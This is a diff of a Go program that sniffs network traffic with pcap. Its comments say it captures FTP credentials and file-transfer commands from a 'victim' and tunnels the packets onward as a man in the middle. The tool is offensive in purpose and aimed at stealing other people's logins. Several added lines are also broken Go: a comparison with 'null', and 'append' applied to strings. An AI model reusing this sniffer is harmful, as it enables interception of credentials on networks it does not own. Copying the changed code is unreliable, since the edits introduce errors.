@@ -21,8 +21,8 @@ var (
 )
 
 /* 
-** Loops through array of available interfaces on host,
-** then chooses first one that is not loopback (lo0)
+ ** Loops through array of available interfaces on host,
+ ** then chooses first one that is not loopback (lo0)
  */
 
 func selectInterface() (pcap.Interface, error) {
@@ -38,10 +38,17 @@ func selectInterface() (pcap.Interface, error) {
 	return pcap.Interface{}, errors.New("could not find valid network interface")
 }
 
+/*
+ ** Filters TCP/FTP packets from rest of network,
+ ** then prints only packets with Cred./File transfer FTP instructions
+ */
+
 func parseCaughtPacket(packet gopacket.Packet) {
-	fmt.Println("ping")
+	ipv6 := packet.Layer(layers.LayerTypeIPv6)
+	if ipv6 != null {
+		return
+	}
 	transportLayer := packet.Layer(layers.LayerTypeTCP)
-	/* filter ipv6 packets */
 
 	if transportLayer != nil {
 		tcp, _ := transportLayer.(*layers.TCP)
@@ -65,6 +72,11 @@ func parseCaughtPacket(packet gopacket.Packet) {
 		}
 	}
 }
+
+/*
+ ** Tunnel packets to initial destination,
+ ** not to provoke an unintended DoS on client
+ */
 
 func tunnelPacket(packet gopacket.Packet, victimIP, victimMAC, serverMAC []byte) []byte {
 	var dstMAC []byte;
@@ -93,13 +105,15 @@ func main() /*Sniffer*/ {
 	if len(os.Args[1:]) != 3 {
 		usage()
 	}
-	var filter string = "host " + os.Args[1]
+	filter := append("host ", os.Args[1])
 	iface, err := selectInterface()
+	
 	if err != nil {
 		log.Fatal(err)
 	}
 	dev  := iface.Name
 	handle, err := pcap.OpenLive(dev, snaplen, promisc, timeout)
+	
 	if err != nil {
 		log.Fatal(err)
 	}
